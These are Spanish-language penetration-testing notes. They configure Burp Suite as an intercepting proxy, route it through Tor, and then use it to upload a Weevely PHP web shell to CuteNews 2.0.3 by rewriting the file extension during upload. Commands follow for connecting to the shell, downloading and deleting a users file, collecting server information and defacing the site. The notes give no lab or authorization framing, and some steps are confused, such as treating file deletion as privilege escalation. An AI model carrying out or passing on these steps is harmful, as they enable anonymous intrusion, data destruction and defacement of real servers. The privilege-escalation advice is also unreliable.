# Shell Upload RFI

## Controlando Peticiones HTTP

Controlar peticiones podemos interceptar y modificar todo lo que este en el navegador.

### Burp Suite 

Burp Suite es una herramienta utilizada principalmente para las auditorías de seguridad en aplicaciones web,  que permite combinar pruebas tanto automáticas. como manuales y que dispone de un gran número de funcionalidades.

* **Target**: permite fijar un objetivo y construir un SiteMap a partir de él.
* **Proxy**: entre navegador e internet, que permite interceptar las peticiones e inspeccionar el tráfico.
* **Spider:** una arana que inspecciona las páginas web y recursos de las aplicación de manera automatizada.
* **Scanner**: un escaner avanzado para aplicaciones web que permite detectar diferentes tipos de vulnerabilidades.
* **Intruder**: automatiza procesos; fuzzing, fuerza bruta, ataques sql, xxs entre otros.
* **Repeater:** manipula las peticiones interceptadas para después replicarlas.
* **Secuencer**: analiza aleatoriamente los tokens de sesión.
* **Decoder**: codificador y decodificador.
* **Comparer:** compara peticiones y respuestas.
* **Extender:** personalización de plugins y ataques.

##### 1. Configurando Burp Suite

El proxy se encontrará en medio de la comunicación entre los navegadores y el servidor web de la página que estamos auditando.

Abrir BurpSuit

```bash
burpsuit
```

Proxy > Options
Proxy Listeners debería estar agregado 127.0.0.1 como hostname y el puerto 8080.

Configurar el proxy de Firefox;

Connection Settings >> Manual proxy configuration
```
HTTP Proxy: 127.0.0.1
Port 8080
Sock v5
```

```
Se puede utilizar la herramienta Foxy Proxy para agilizar el procedimiento
```

#### 2. Interceptando 

Tan fácil como ir a BurpSuit >> Proxy >> Interception >> Interception ON 

Ya con eso podemos interceptar el trafico de nuestro navegador.

#### 3. Creando certificados CA.

Cada vez que intentemos entrar en alguna web HTTPS nos advertira que el sitio es inseguro y tendremos que anadir la excepción, para evitar esto solo tienes que crear un CA.

Burpsuit >> Proxy >> Options >> CA certificate >> Export >> Certificate in DER Format y lo guardamos

Firefox >> Settings >> Expert >> See Certificate >> Import

Seleccionamos los cerficados anteriores y listo.

#### 4. Anonimato con BurpSuit 

Podemos agregar un anonitamo con TOR, abriendo el navegador TOR y viendo en que puerto recibe TOR la conexión.

TOR Browser >> Settings >> Expert >> Network >> Configuration 
```
IP 127.0.0.1
Port 9150
Socks v5
```

Luego replicar la configuración en Burp Suite

BurpSuit >> Options >> Connections >> Use SOCKS Proxy
```
SOCKS proxy host: 127.0.0.1
SOCKS proxy port: 9150
```

Y se comprueba en la ventada BurpSuit >> Alerts


## Weevely

*Weevely* es un *shell web* para CuteNew diseñado para fines posteriores a la explotación que puede extenderse a través de la red en tiempo de ejecución.

Cargue el agente PHP weevely a un servidor web de destino para obtener acceso de shell remoto a él. Tiene más de 30 módulos para ayudar con las tareas administrativas, mantener el acceso, proporcionar conocimiento de la situación, elevar los privilegios y diseminarse a la red objetivo.

Lea la página Instalar para instalar weevely y sus dependencias.

Lea la página de Introducción para generar un agente y conectarse a él.

Explore la Wiki para leer ejemplos y casos de uso.
https://github.com/epinna/weevely3

Para generar, solo ha

```bash
cd weevely3
./weevely.py generate <password> <name>.php
```

1. Ir alguna parte de la página web donde se necesite subir algun archivo.
2. Interceptar la web con el proxy de BurpSuit
3. Intentar enviar el archivo.
3. BurpSuit hay que inspeccionar que se logre interceptar, hay que modificar la salida a .php y liberar con el Forward.
4. El BurpSuit regresará una instrucción GET que indica a que parte del servidor fue subido el archivo.
5. Luego se regresa a la consola y se inyecta el archivo.
```bash
./weevely.py http://servidor/cutenews.2.0.3/uploads/avatar_vicente_DEVIL.php passwd
```

6. Para escalar privilegios, se puede descargar el archivo usrs.txt para luego borrarlos.
```bash
file_download users.txt /tmp/users.txt
del users.txt 
```

* Buscar la información del servidor
```bash
system_info -info client_ip
```

* Deface
```bash
file_upload /direccion/archivo/index.html
```









